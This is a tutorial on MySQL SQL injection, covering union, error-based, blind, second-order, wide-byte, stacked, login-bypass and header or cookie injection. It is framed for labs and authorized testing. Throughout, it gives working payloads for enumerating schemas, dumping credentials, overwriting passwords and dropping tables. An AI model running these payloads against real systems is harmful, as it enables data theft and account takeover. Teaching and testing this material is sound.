---
title: SQL Injection Vulnerabilities
---
## Complete Analysis of SQL Injection Vulnerabilities

## Prerequisites for SQL Injection Vulnerabilities

### Knowledge Points Related to MySQL Injection

By default, MySQL stores an `information_scheme` database. In that database, remember three table names: `SCHEMEATA`, `TABLES`, and `COLUMNS`.

The `SCHEMATA` table stores the names of all databases created by the user. The database-name field to remember is `SCHEMA_NAME`.

The `TABLES` table stores database names and table names for all databases created by the user. The field names are `TABLE_SCHEMA` and `TABLE_NAME`.

The `COLUMNS` table stores database names, table names, and field names for all databases created by the user. The fields are `TABLE_SCHEMA`, `TABLE_NAME`, and `COLUMN_NAME`.

#### Several Functions

`database()`: the database used by the current website

`version()`: the current MySQL version

`user()`: the current MySQL user

#### Comments

Comment markers: `#` `--` space `/**/`

Inline comments: `/*！ code */`

### Preface

SQL injection is one of the most classic, most damaging, and most widespread vulnerability classes in web security.

Its essence is not that "the database is too weak", but that **user input is not treated as data; after being concatenated into an SQL statement, it is executed as code**.

As long as backend code contains logic like this:

```sql
select * from users where id = '$id'
```

and `$id` comes directly from a user request parameter:

```http
?id=1
```

an attacker may craft special input to change the original SQL semantics and then:

- Bypass login
- Obtain database names
- Obtain table names and field names
- Read sensitive data
- Modify or delete data
- Expand the impact further in high-privilege scenarios

This article fully breaks down SQL injection in the order of "vulnerability causes -> underlying principles -> injection types -> real business SQL scenarios -> defense solutions".

### Reading Guide: Understand Each Injection Type in One Sentence First

The essence of SQL injection is not complicated: **user input is executed as part of an SQL statement**. The differences between injection methods do not come from a different vulnerability essence, but from **where the data is placed in the SQL statement, whether the page displays output, and how the database returns results**.

| Injection Type               | Plain-language explanation                                                              | Most important condition                                        |
| :--------------------------- | :-------------------------------------------------------------------------------------- | :-------------------------------------------------------------- |
| Union query injection        | Append the attacker's query result after the data the page originally wanted to display | The page has normal data output, and column count/types align   |
| Error-based injection        | Put sensitive data into database error messages and let the page print the error         | The site displays raw database errors                           |
| Boolean blind injection      | The page shows no data; infer each bit from whether the page behaves normally            | Stable difference between true/false page behavior              |
| Time blind injection         | Even true/false differences are invisible, so use "whether it delays" as the answer      | The database can execute delay functions and jitter is controlled |
| Second-order injection       | The first input only stores data; injection triggers when business logic reads it later  | Stored database content is concatenated into SQL again          |
| Wide-byte injection          | Encoding conversion swallows the escape character, so a protected quote becomes active  | Mismatch between GBK/GB2312 multibyte encodings and escaping    |
| Stacked query injection      | Use a semicolon to insert multiple SQL statements into one request                       | The database driver allows multi-statement execution            |
| Login bypass injection       | Rewrite the login SQL condition so password verification is bypassed                     | Login parameters are directly concatenated into a WHERE clause  |
| POST/Cookie/Header injection | The injection point is in the request body, Cookie, or request header, not the URL       | The backend trusts these inputs and concatenates SQL            |
| LIKE/ORDER BY/LIMIT injection | The injection point is in special SQL syntax such as search, sorting, or pagination     | Developers directly splice business parameters into SQL syntax  |
| INSERT/UPDATE/DELETE injection | The injection point is in write, update, or delete statements                          | Write-operation SQL is not parameterized, so impact may be direct |
| IN-parameter injection       | A multi-select ID list is spliced into `in (...)`; the attacker closes the parentheses   | The server directly concatenates comma-separated lists          |
| Base64-encoded injection     | Base64 is only a wrapper; after decoding, the content is still a controllable SQL fragment | The decoded content continues to participate in SQL concatenation |

All injections can be understood as the same chain:

```text
Controllable input -> concatenated into SQL -> changes original SQL semantics -> database executes abnormal semantics -> results are returned through output/errors/true-false/time/side effects
```


> The following statements are only for local labs, sqli-labs, DVWA, test environments, and authorized security testing.

---

## 1. Core Definition of SQL Injection

### 1.1 What Is SQL Injection?

SQL injection means an attacker inserts malicious SQL fragments into backend SQL statements through controllable input points, changing the original SQL logic so the database executes queries, judgments, delays, errors, or data operations constructed by the attacker.

In one sentence:

> After user input is spliced into SQL, data becomes code.

---

### 1.2 Root Cause of SQL Injection

The root cause of SQL injection is not one special character, but:

```text
User input + string-concatenated SQL + no parameterization = SQL injection
```

Typical vulnerable code:

```php
$id = $_GET['id'];
$sql = "select * from users where id='$id'";
$result = mysqli_query($conn, $sql);
```

Normal access:

```http
?id=1
```

Actual SQL:

```sql
select * from users where id='1'
```

Malicious access:

```http
?id=1' or '1'='1
```

The actual SQL becomes:

```sql
select * from users where id='1' or '1'='1'
```

The query originally returned only the user with `id=1`; now it becomes an always-true condition, and the query logic is controlled by the attacker.

---

## 2. Basic SQL Injection Assessment Flow

### 2.1 Determining Whether an Injection Point Exists

Common test method:

```http
?id=1'
```

If the page shows a database error, such as:

```text
You have an error in your SQL syntax
```

it means the single quote broke the original SQL structure, and character-based injection may exist.

---

### 2.2 Numeric and Character-Based Injection

#### Numeric SQL

Backend statement:

```sql
select * from users where id=$id
```

Normal parameter:

```http
?id=1
```

Injection test:

```http
?id=1 and 1=1
?id=1 and 1=2
```

Actual SQL:

```sql
select * from users where id=1 and 1=1
select * from users where id=1 and 1=2
```

If the former is normal and the latter is abnormal or returns no data, numeric injection exists.

---

#### Character-Based SQL

Backend statement:

```sql
select * from users where username='$name'
```

Normal parameter:

```http
?name=admin
```

Injection test:

```http
?name=admin' and '1'='1
?name=admin' and '1'='2
```

Actual SQL:

```sql
select * from users where username='admin' and '1'='1'
select * from users where username='admin' and '1'='2'
```

Character-based injection needs to close quotes. Common closure methods include:

```sql
'
"
')
")
'))
"))
```

---

### 2.3 Role of Comment Markers

Attackers often use comment markers to truncate subsequent SQL:

```sql
--+
#
/*
```

For example, the original SQL:

```sql
select * from users where id='1' and status='normal'
```

Injected parameter:

```http
?id=1' or '1'='1' --+
```

Actual SQL:

```sql
select * from users where id='1' or '1'='1' -- ' and status='normal'
```

The later condition is commented out, and the query logic is changed.

---

## 3. Union Based SQL Injection

### 3.1 Core Definition

#### Plain-language Explanation

Union query injection can be understood like this: **the website originally only wanted to query its own data, but the attacker uses `union select` to insert another query and makes the database merge both result sets before returning them to the page.**

It does not make the database "open an extra backdoor"; it borrows SQL's built-in set-merging ability. As long as one location on the page displays query results, the attacker may disguise database names, table names, field names, or field contents as "normal query results" and display them.

#### Requirements

- **The page has data output**: query results must be displayed on the page; otherwise, unioned data has no exit.
- **The column count is consistent**: however many columns the original query has, the `union select` must provide the same number.
- **Field types are compatible**: display columns should preferably be able to carry strings, otherwise sensitive data may not display normally.
- **The original SQL can be closed**: the first half of the SQL must be closed correctly based on numeric, character, parenthesized, and other contexts.

#### Underlying Data Flow

```text
User parameter -> close original query -> append union select -> database merges result sets -> page displays visible columns -> data leakage
```

#### Common Misconception

The focus of union query injection is not "how complex the payload is", but first finding three things: **how many columns there are, which column is displayed, and how the current SQL is closed**. Once these three are confirmed, enumerating databases, tables, and fields is essentially just changing the query target.


Union query injection uses `union select` to splice attacker-constructed query results into the original query results, then displays sensitive database information through normal page output positions.

Requirements:

- The page has a normal data display position
- The original SQL and union query have the same number of fields
- Field types are as compatible as possible
- The current database user has query permissions

---

### 3.2 Basic Principle of Union Injection

Original SQL:

```sql
select id,username,password from users where id=1
```

Attacker construction:

```http
?id=1 union select 1,2,3
```

Actual SQL:

```sql
select id,username,password from users where id=1
union select 1,2,3
```

If the page displays `2` or `3`, the corresponding position can display data.

---

### 3.3 Determining the Number of Fields

Commonly use `order by` to determine the number of fields:

```http
?id=1 order by 1 --+
?id=1 order by 2 --+
?id=1 order by 3 --+
?id=1 order by 4 --+
```

If:

```http
order by 3 is normal
order by 4 errors
```

the original query has 3 fields.

---

### 3.4 Determining Display Positions

```http
?id=-1 union select 1,2,3 --+
```

Why is `id=-1` often used?

Because making the original query return no data makes it easier for the page to display the result after `union`.

Actual SQL:

```sql
select id,username,password from users where id=-1
union select 1,2,3
```

If the page displays:

```text
Username: 2
Password: 3
```

columns 2 and 3 are display positions.

---

### 3.5 Obtaining Current Database Information

```http
?id=-1 union select 1,database(),version() --+
```

Actual SQL:

```sql
select id,username,password from users where id=-1
union select 1,database(),version()
```

Possible output:

```text
security
5.7.26
```

---

### 3.6 Querying All Database Names

```http
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata --+
```

Core table:

```sql
information_schema.schemata
```

Core field:

```sql
schema_name
```

---

### 3.7 Querying All Table Names in the Current Database

```http
?id=-1 union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database() --+
```

---

### 3.8 Querying Field Names in a Specific Table

Assume a table named `users` exists:

```http
?id=-1 union select 1,group_concat(column_name),3
from information_schema.columns
where table_schema=database()
and table_name='users' --+
```

---

### 3.9 Querying User Data

Assume the fields are:

```sql
username,password
```

Construction:

```http
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users --+
```

Where:

```text
0x3a = :
```

Possible output:

```text
admin:admin123,test:123456
```

---

### 3.10 Union Injection Data Flow

```text
User input
  ↓
Spliced into the where condition
  ↓
Close the original SQL structure
  ↓
union select appends a new query
  ↓
The database executes both queries
  ↓
Result sets are merged
  ↓
The page displays attacker-specified fields
```

---

## 4. Error Based SQL Injection

### 4.1 Core Definition

#### Plain-language Explanation

Error-based injection can be understood like this: **the page may not display normal query results, but it displays database errors; the attacker puts the data they want into the error message and lets the database report it.**

The most classic examples are MySQL's `updatexml()` and `extractvalue()`. They were originally XML processing functions and require a valid XPath path. The attacker deliberately passes an invalid path and concatenates data such as `database()`, table names, and field names into it. When the database reports an error, it prints the invalid path along with the error.

#### Requirements

- **An injection point exists**: user input can enter the SQL statement.
- **Errors are visible**: the website does not hide raw database error messages.
- **Functions are available**: the target database version and function behavior match, such as MySQL 5.1+ XML functions.
- **The error content includes parameters**: the error message can carry the string concatenated by the attacker.

#### Underlying Data Flow

```text
Controllable parameter -> spliced into SQL -> passed into error function -> invalid syntax triggers an error -> error message carries query result -> page displays it
```

#### Why Normal Functions Become Error Tools

The second parameter of `updatexml()` and `extractvalue()` normally requires a valid XPath, such as `//user/name`. When an attacker passes an invalid path like `~database_name`, the database returns an error similar to `XPATH syntax error` to help developers locate the issue, and it outputs the invalid parameter content as well.

This is not a "deliberate database backdoor"; rather, a **debug-friendly error display mechanism** is amplified by an SQL concatenation vulnerability.


Error-based injection uses the error display mechanism of database functions to concatenate sensitive data into error messages and then leak it through page errors.

Applicable conditions:

- SQL injection exists
- The page displays raw database errors
- Database functions support controllable error content

---

### 4.2 `updatexml` Error-Based Injection

Typical statement:

```http
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
```

Actual SQL:

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database(),0x7e),1)
```

Error output:

```text
XPATH syntax error: '~security~'
```

This indicates the current database name is:

```text
security
```

---

### 4.3 `extractvalue` Error-Based Injection

```http
?id=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
```

Actual SQL:

```sql
select * from users
where id='1'
and extractvalue(1,concat(0x7e,database(),0x7e))
```

---

### 4.4 Querying Table Names

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(table_name)
from information_schema.tables
where table_schema=database()),0x7e),1) --+
```

---

### 4.5 Querying Field Names

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(column_name)
from information_schema.columns
where table_name='users'
and table_schema=database()),0x7e),1) --+
```

---

### 4.6 Querying Account Passwords

```http
?id=1' and updatexml(1,concat(0x7e,
(select group_concat(username,0x3a,password)
from users),0x7e),1) --+
```

---

### 4.7 Error-Based Injection Length Limits

MySQL XML error functions usually have output length limits; commonly only about 32 characters can be displayed.

Therefore, split extraction is needed:

```sql
substr(field,1,32)
substr(field,33,32)
substr(field,65,32)
```

Example:

```http
?id=1' and updatexml(1,concat(0x7e,
substr((select group_concat(username,0x3a,password) from users),1,32),
0x7e),1) --+
```

---



### 4.8 Principle of `floor` Random-Number Grouping Errors

Besides XML function errors, MySQL also has a classic `floor(rand()*2)` grouping error. It is not the same mechanism as `updatexml()`: XML function errors are **syntax validation errors**, while `floor(rand()*2)` is more like a **logical conflict during grouped calculation**.

#### Plain-language Explanation

You can think of it as the database doing grouped statistics and needing to put each group into a temporary table. But `rand()` may change every time it is evaluated, causing the database to see inconsistent grouping keys before and after evaluation, eventually triggering a duplicate-key error. The attacker concatenates the desired data into the grouping key, and the error message may carry the data along.

#### Trigger Chain

```text
Construct subquery -> concat sensitive data and random grouping value -> group by creates temporary groups -> repeated rand evaluation causes key conflict -> duplicate entry error carries data
```

#### Difference from XML Errors

| Type                      | Trigger reason                                     | Typical behavior       |
| :------------------------ | :------------------------------------------------- | :--------------------- |
| XML function error        | Invalid XPath parameter                            | `XPATH syntax error`   |
| floor random-number error | Conflict between `group by` and repeated `rand()` evaluation | `Duplicate entry` |

This type of error also depends on the website displaying database errors. If raw errors are uniformly disabled in production, even if the underlying expression triggers an exception, it is hard for an attacker to obtain data directly from the page.

## 5. Boolean Based Blind SQL Injection

### 5.1 Core Definition

#### Plain-language Explanation

Boolean blind injection is like playing a "guessing game" with the database: **the page does not tell you what the data is, but it answers true or false through whether the page is normal, whether data exists, or whether content changes.**

The attacker cannot obtain the result at once and can only split the question into many yes/no questions, such as "is the first character of the database name `s`?" or "is the ASCII value greater than 100?". Each page response gives a true/false signal, and the final answer is assembled bit by bit.

#### Requirements

- **The page does not directly display data**: otherwise, union query or error-based injection is preferred.
- **True and false conditions differ**: when the condition is true or false, page content, length, status code, or business prompts differ.
- **Responses are stable**: page differences must not change randomly, otherwise judgments become inaccurate.
- **Conditional expressions can be constructed**: logic such as `and`, `or`, comparison operations, and string extraction can be used.

#### Underlying Data Flow

```text
Construct true/false question -> database evaluates condition -> page behavior differs -> record 0/1 answer based on difference -> restore data over many rounds
```

#### Common Misconception

Boolean blind injection is not "if you cannot see it, you cannot inject". It **turns data reading from a one-time display into multiple rounds of true/false judgment**. It is slow, but widely applicable: as long as the page can stably distinguish true from false, it can be exploited.


Boolean blind injection is used when the page has no direct data output and no error information. By constructing true/false conditions and observing differences in page responses, data can be inferred bit by bit.

The page only needs two states:

```text
Condition true: page normal
Condition false: page abnormal / no data / content changed
```

---

### 5.2 Identifying Boolean Blind Injection

```http
?id=1' and 1=1 --+
?id=1' and 1=2 --+
```

If:

```text
1=1 page normal
1=2 page has no data
```

boolean blind injection can be used.

---

### 5.3 Guessing the Database Name Length

```http
?id=1' and length(database())=8 --+
```

Actual SQL:

```sql
select * from users
where id='1'
and length(database())=8
```

If the page is normal, the current database name length is 8.

---

### 5.4 Guessing the Database Name Character by Character

```http
?id=1' and substr(database(),1,1)='s' --+
```

Determine whether the first character is `s`.

ASCII can also be used:

```http
?id=1' and ascii(substr(database(),1,1))=115 --+
```

Where:

```text
115 = s
```

---

### 5.5 Optimizing Guessing with Binary Search

Brute-forcing one character at a time is inefficient. You can use greater-than and less-than comparisons:

```http
?id=1' and ascii(substr(database(),1,1))>100 --+
?id=1' and ascii(substr(database(),1,1))>110 --+
?id=1' and ascii(substr(database(),1,1))>115 --+
```

Use binary search to quickly narrow the range.

---

### 5.6 Guessing Table Names

Query the first character of the first table name:

```http
?id=1' and ascii(substr(
(select table_name from information_schema.tables
where table_schema=database()
limit 0,1),1,1))=117 --+
```

If the page is normal, the first character of the first table name is:

```text
u
```

---

### 5.7 Boolean Blind Injection Data Flow

```text
The attacker constructs true/false checks
  ↓
The database executes the condition
  ↓
The page produces two different responses
  ↓
The attacker records true/false results
  ↓
Infer database content character by character
```

---

## 6. Time Based Blind SQL Injection

### 6.1 Core Definition

#### Plain-language Explanation

Time blind injection is a further degraded form of boolean blind injection: **if true and false pages look exactly the same, make the database deliberately sleep for several seconds when the condition is true, and use response time as the answer.**

For example, execute `sleep(5)` when the condition is true, otherwise return immediately. The attacker determines whether the current guess is correct by observing whether the page is delayed.

#### Requirements

- **Page content has no reliable difference**: ordinary boolean blind injection is hard to judge.
- **The database supports delay functions**: such as MySQL's `sleep()` and `benchmark()`.
- **The network environment is relatively stable**: the delay difference must be larger than normal network jitter.
- **The backend does not enforce strict timeout interception**: otherwise, delayed results may be uniformly cut off.

#### Underlying Data Flow

```text
Construct condition -> delay if condition is true -> return normally if condition is false -> observe response time -> infer data over many rounds
```

#### Common Misconception

Time blind injection does not rely on "the page displaying results", but on "time as a side channel". Therefore, it is usually slower than boolean blind injection and more easily affected by timeouts, rate limits, WAFs, and network jitter.

Time blind injection is used when the page has no output, no errors, and true/false pages are not obviously different. It determines whether conditions are true or false through database delay functions.

Core idea:

```text
Condition true -> delay 5 seconds
Condition false -> no delay
```

---

### 6.2 Common MySQL Delay Functions

```sql
sleep(5)
benchmark(10000000,md5(1))
```

---

### 6.3 Identifying Time Blind Injection

```http
?id=1' and sleep(5) --+
```

If the page response is clearly delayed by 5 seconds, time blind injection may exist.

A more rigorous check:

```http
?id=1' and if(1=1,sleep(5),0) --+
?id=1' and if(1=2,sleep(5),0) --+
```

If the former is delayed and the latter is not, the injection is confirmed.

---

### 6.4 Guessing the Database Name Length

```http
?id=1' and if(length(database())=8,sleep(5),0) --+
```

---

### 6.5 Guessing the Database Name Character by Character

```http
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0) --+
```

If the response is delayed by 5 seconds, the first character is `s`.

---

### 6.6 Guessing Table Names

```http
?id=1' and if(ascii(substr(
(select table_name from information_schema.tables
where table_schema=database()
limit 0,1),1,1))=117,sleep(5),0) --+
```

---

### 6.7 Characteristics of Time Blind Injection

Advantages:

- Does not rely on page output
- Does not rely on database errors
- Relatively stealthy

Disadvantages:

- Slow
- Easily affected by network fluctuations
- Large numbers of requests are easily found in logs

---

## 7. Second Order SQL Injection

### 7.1 Core Definition

#### Plain-language Explanation

Second-order injection is the easiest to underestimate. Its characteristic is: **malicious content does not trigger when first submitted; the system stores it in the database as ordinary data, and the vulnerability actually erupts only when later business logic reads this data and concatenates it into SQL.**

You can think of it as "delayed detonation" SQL injection. Fields that seem only to save data, such as registration usernames, nicknames, addresses, notes, and ticket titles, may become raw material for later SQL concatenation.

#### Requirements

- **The first entry point can write to the database**: the attack string can be saved.
- **A second business process reads that field**: such as password modification, order lookup, or report generation.
- **The read value is concatenated into SQL again**: stored data is treated as part of an SQL fragment rather than as an ordinary value.
- **The two business flows are related**: frontend input can affect backend or later functionality.

#### Underlying Data Flow

```text
First request writes malicious string -> database stores it -> later business logic reads that string -> concatenates SQL again -> injection triggers
```

#### Common Misconception

Second-order injection does not mean "safe because there was no error on input". Many systems only check the first hop and ignore that **after data enters the database, it may still enter SQL statements again**. This is also why it is more hidden in real business systems.


Second-order injection means malicious SQL code does not trigger immediately when first submitted, but is stored in the database. When the system reads that data a second time and concatenates it into SQL, injection is triggered.

Core flow:

```text
First request: malicious data enters database
Second request: system reads malicious data
Third step: malicious data is concatenated into SQL
Injection finally triggers
```

---

### 7.2 Typical Business Scenario

User registration:

```http
username=admin'#
password=123456
```

During the first registration, the backend may escape the input or may not trigger a query exception, and it stores the username in the database:

```text
admin'#
```

---

### 7.3 Password Modification Scenario Triggering Second-Order Injection

Backend password modification logic:

```php
$username = $_SESSION['username'];
$newpass = $_POST['newpass'];

$sql = "update users set password='$newpass' where username='$username'";
```

When `$username` is read from the database as:

```text
admin'#
```

the actual SQL becomes:

```sql
update users set password='newpass' where username='admin'#'
```

The following quote is commented out, which may eventually modify the password of the `admin` user.

---

### 7.4 Real Business Statement Example for Second-Order Injection

#### First: Register a Malicious Username

```sql
insert into users(username,password)
values('admin''#','123456');
```

The actual username stored in the database:

```text
admin'#
```

#### Second: Trigger During Password Modification

```sql
update users set password='hacked123'
where username='admin'#'
```

Equivalent to:

```sql
update users set password='hacked123'
where username='admin'
```

---

### 7.5 Difficulties of Second-Order Injection

Second-order injection is hard to discover because the first request may:

- Show a normal page
- Produce no error
- Have no obvious output
- Not necessarily be found by scanners

The real danger is:

```text
Safe when written into the database != safe when read back and concatenated into SQL
```

---

## 8. Wide Byte SQL Injection

### 8.1 Core Definition

#### Plain-language Explanation

The core of wide-byte injection is encoding mismatch: **the program thinks it has escaped the quote with a backslash, but when the database parses it with a multibyte encoding such as GBK, the backslash may be "eaten" by the preceding byte, making the quote valid SQL syntax again.**

In other words, the developer sees `\'` and thinks the quote is safe; the database may ultimately see a wide character plus a real `'`, and the original SQL is closed.

#### Requirements

- **The database connection uses a multibyte encoding such as GBK/GB2312**.
- **The program uses escaping instead of prepared statements**, such as relying on `addslashes()`.
- **Attacker-controlled input can enter a character-based SQL position**.
- **Frontend and backend encoding handling is inconsistent**, giving special byte combinations a chance to change parsing.

#### Underlying Data Flow

```text
Input special byte -> program adds backslash escaping -> database parses using wide-byte encoding -> backslash merges into previous character -> quote escape succeeds
```

#### Common Misconception

Wide-byte injection is not "some mysterious character that universally bypasses protection"; it is **a conflict between encoding parsing and escaping order**. As long as real parameterized queries are used, attacker input will not be parsed as SQL syntax, and this type of issue naturally disappears.


Wide-byte injection is common in GBK-encoded environments. When a program uses an escaping function to convert a single quote `'` into `\'`, an attacker constructs special bytes that cause the backslash `\` to be "eaten" by the previous byte, releasing the single quote again and completing injection.

Common conditions:

- The database connection uses wide-byte encodings such as GBK or GB2312
- The backend uses simple escaping, such as `addslashes()`
- Input is concatenated into SQL
- Prepared statements are not used

---

### 8.2 Ordinary Escaping Logic

Attacker input:

```text
1'
```

After escaping:

```text
1\'
```

The SQL becomes:

```sql
select * from users where id='1\''
```

The single quote is escaped and cannot close the string.

---

### 8.3 Principle of Wide-Byte Bypass

Attacker input:

```http
?id=1%df'
```

After escaping:

```text
1%df\'
```

Where:

```text
' is escaped as \'
```

After URL encoding, the bytes are:

```text
%df%5c%27
```

Under GBK encoding:

```text
%df%5c
```

may be recognized as a valid Chinese character, causing `\` to be merged and eaten, leaving `'` to act as a closing quote again.

The final SQL is similar to:

```sql
select * from users where id='1運' and 1=1 --+'
```

The single quote successfully escapes.

---

### 8.4 Wide-Byte Injection Test Statements

```http
?id=1%df' and 1=1 --+
?id=1%df' and 1=2 --+
```

If the former is normal and the latter is abnormal, wide-byte injection may exist.

---

### 8.5 Wide-Byte Union Injection

```http
?id=-1%df' union select 1,database(),version() --+
```

---

### 8.6 Essence of Wide-Byte Injection

```text
It is not that the single quote was not escaped
but that the backslash was swallowed by wide-byte encoding
causing the single quote to become an SQL syntax character again
```

---

## 9. Stacked Queries Injection

### 9.1 Core Definition

#### Plain-language Explanation

Stacked injection can be understood like this: **one request should originally execute only one SQL statement, but the attacker appends a second and third SQL statement with semicolons, making the database execute them in sequence.**

It is different from union query injection. Union query injection mainly "borrows the page to display data"; stacked injection may directly execute writes, modifications, deletes, table creation, function calls, and other operations, so its risk is more direct.

#### Requirements

- **The database and driver allow multi-statement execution**.
- **The backend has not disabled multi statements**.
- **The injection point can close the current statement and append a semicolon**.
- **The database account has the permissions required by subsequent statements**.

#### Underlying Data Flow

```text
Close original SQL -> use semicolon to end current statement -> append new SQL -> database executes multiple statements in order
```

#### Common Misconception

Not every SQL injection supports stacking. Many database drivers disable multi-statement execution by default, so even if ordinary injection is confirmed during testing, stacked statements may still be blocked at the driver layer.


Stacked injection means attackers use semicolon `;` to execute multiple SQL statements in a single request.

Ordinary injection usually can only change one query statement, while stacked injection can additionally execute:

```sql
insert
update
delete
drop
create
```

It is more dangerous.

---

### 9.2 Stacked Injection Example

Original SQL:

```sql
select * from users where id='$id'
```

Attack parameter:

```http
?id=1'; update users set password='123456' where username='admin' --+
```

Actual SQL:

```sql
select * from users where id='1';
update users set password='123456' where username='admin' -- '
```

---

### 9.3 Applicability Limits of Stacked Injection

Not all environments support stacked injection.

Common cases:

| Environment                 | Common support status                |
| --------------------------- | ------------------------------------ |
| MySQL + ordinary mysqli query | Usually does not support multi statements |
| MySQL + multi_query         | Supported                            |
| SQL Server                  | Commonly supported                   |
| PostgreSQL                  | Supported in some scenarios          |
| SQLite                      | Depends on the driver                |

---

### 9.4 Impact of Stacked Injection

If permissions are sufficient, it may cause:

```sql
update users set role='admin' where username='test';
delete from logs;
drop table users;
```

Therefore, stacked injection is more dangerous than ordinary query-style injection.

---

## 10. Login Bypass Injection

### 10.1 Typical Login SQL

#### Plain-language Explanation

The essence of login bypass injection is: **change the password verification logic in the login SQL so the database thinks the condition has already been satisfied.**

Normal login should require both username and password, for example `username='admin' and password='xxx'`. By closing quotes, appending `or` conditions, and commenting out the second half, the attacker changes the SQL into "the username exists or the condition is always true".

#### Requirements

- **The username or password field is directly concatenated into SQL**.
- **The login logic relies on SQL returned row count to determine success**.
- **Comment markers or logical operators can change the WHERE condition**.
- **No secondary password hash verification or multi-factor authentication exists**.

#### Underlying Data Flow

```text
Input login parameters -> concatenate into WHERE condition -> rewrite account/password judgment logic -> query returns user record -> login succeeds
```

#### Common Misconception

Login bypass does not necessarily require knowing the password. It exploits a **logic flaw in the authentication SQL**. The defense focus is not simply filtering `or`, but ensuring username and password always enter SQL as parameter values and that password hashes are strictly verified.


```sql
select * from users
where username='$username'
and password='$password'
```

Normal login:

```text
username=admin
password=123456
```

Actual SQL:

```sql
select * from users
where username='admin'
and password='123456'
```

---

### 10.2 Universal Password Bypass

Input:

```text
username=admin' --+
password=anything
```

Actual SQL:

```sql
select * from users
where username='admin' --+'
and password='anything'
```

The password condition is commented out, so only the username is checked.

---

### 10.3 Always-True OR Bypass

Input:

```text
username=' or '1'='1' --+
password=anything
```

Actual SQL:

```sql
select * from users
where username='' or '1'='1' --+'
and password='anything'
```

Because:

```sql
'1'='1'
```

is always true, the first user record may be logged in directly.

---

### 10.4 Common Login Bypass Payloads

```sql
' or '1'='1' --+
' or 1=1 --+
admin' --+
admin'# 
') or ('1'='1' --+
" or "1"="1" --+
```

---

## 11. POST Injection

### 11.1 Core Definition

#### Plain-language Explanation

POST injection is essentially no different from GET injection. The only difference is: **the parameter is not in the URL query string, but in the request body.**

Many people only stare at `?id=1` in the address bar, but login forms, search forms, JSON APIs, and backend configuration submissions often pass parameters through POST. As long as the backend directly concatenates POST fields into SQL, it is an injection point.

#### Requirements

- **POST form or API fields are controllable**.
- **The backend concatenates fields into SQL**.
- **The server does not use parameterized queries**.
- **Testing tools can modify the request body**, such as Burp Suite, curl, or Postman.

#### Underlying Data Flow

```text
Request body parameter -> backend reads POST field -> concatenates SQL -> database executes rewritten statement
```

#### Common Misconception

POST is not naturally safer than GET. The HTTP method only decides where parameters are placed; it does not decide whether parameters are trustworthy. **Anything from the client should be treated as untrusted input.**


POST injection and GET injection are essentially the same; only the parameter location differs.

GET parameters are in the URL:

```http
?id=1
```

POST parameters are in the request body:

```http
username=admin&password=123456
```

---

### 11.2 POST Login Injection Example

Request body:

```http
username=admin' --+&password=abc
```

Backend SQL:

```sql
select * from users
where username='admin' --+'
and password='abc'
```

---

### 11.3 JSON-Format POST Injection

Modern systems commonly use JSON requests:

```json
{
  "username": "admin",
  "password": "123456"
}
```

Vulnerable input:

```json
{
  "username": "admin' --+",
  "password": "anything"
}
```

Actual SQL:

```sql
select * from users
where username='admin' --+'
and password='anything'
```

---

## 12. Cookie Injection

### 12.1 Core Definition

#### Plain-language Explanation

The core of Cookie injection is: **Cookies are also input that users can modify; they are not inherently trustworthy data from the server.**

If a system takes Cookie values such as `uid`, `role`, and `tracking_id` and uses them to concatenate SQL for user information, access records, or statistics, an attacker can modify the Cookie to trigger injection.

#### Requirements

- **Cookie fields participate in database queries**.
- **The server does not validate or sign Cookie contents**.
- **Cookie values are directly concatenated into SQL**.
- **Business logic trusts identity or preference fields stored on the client**.

#### Underlying Data Flow

```text
Tamper with Cookie -> server reads Cookie -> concatenates SQL query -> database executes abnormal semantics -> output/error/blind judgment
```

#### Common Misconception

Cookies look "system-generated" in the browser, but to attackers they are as controllable as URL parameters. The server cannot assume a field is trusted just because it comes from a Cookie.


Cookie injection means the backend reads values from Cookies and concatenates them into SQL; the attacker triggers injection by modifying the Cookie.

For example:

```http
Cookie: uid=1
```

Backend code:

```php
$uid = $_COOKIE['uid'];
$sql = "select * from users where id='$uid'";
```

---

### 12.2 Cookie Injection Example

Malicious Cookie:

```http
Cookie: uid=1' and updatexml(1,concat(0x7e,database()),1) --+
```

Actual SQL:

```sql
select * from users
where id='1'
and updatexml(1,concat(0x7e,database()),1) --+'
```

---

## 13. Header Injection

### 13.1 Common Injection Locations

#### Plain-language Explanation

Header injection occurs in request headers, such as `User-Agent`, `Referer`, and `X-Forwarded-For`. It is common in logging, statistics, auditing, and risk-control scenarios: **the system writes request headers into the database, or directly concatenates SQL when later querying data by request headers.**

This kind of injection may not show up immediately on the page. Sometimes it becomes second-order injection: it is first written into a log table, then triggers when a backend administrator views logs or the system generates reports.

#### Requirements

- **The server reads and uses request header fields**.
- **Header content enters SQL insert or query statements**.
- **Logging/statistics/auditing functionality is not parameterized**.
- **There is an error, delay, backend display, or later query chain**.

#### Underlying Data Flow

```text
Forge request header -> backend records/queries Header -> concatenates SQL -> writes abnormal data or triggers query injection -> output/delay/second-order trigger
```

#### Common Misconception

Headers are not safe just because "the browser automatically sends them". Attack tools can arbitrarily modify request headers, so all Header fields should be treated as user input, especially Headers that are stored in the database.


Some systems record user request information, such as:

- User-Agent
- Referer
- X-Forwarded-For
- Client-IP

If these fields are written to the database without prepared statements, SQL injection may occur.

---

### 13.2 User-Agent Injection

Backend log SQL:

```sql
insert into access_log(ip,user_agent)
values('$ip','$ua')
```

Attacker construction:

```http
User-Agent: test',updatexml(1,concat(0x7e,database()),1)) --+
```

Actual SQL may become:

```sql
insert into access_log(ip,user_agent)
values('127.0.0.1','test',updatexml(1,concat(0x7e,database()),1)) --+')
```

---

### 13.3 X-Forwarded-For Injection

Request header:

```http
X-Forwarded-For: 127.0.0.1' or sleep(5) --+
```

Backend SQL:

```sql
insert into login_log(ip,username)
values('127.0.0.1' or sleep(5) --+','admin')
```

---

## 14. Search-Box LIKE Injection

### 14.1 Typical Business SQL

#### Plain-language Explanation

LIKE injection is common in search boxes. Normal SQL may be `where title like '%keyword%'`. If attacker input is directly concatenated, they can first close the quote and percent sign, then append their own SQL logic.

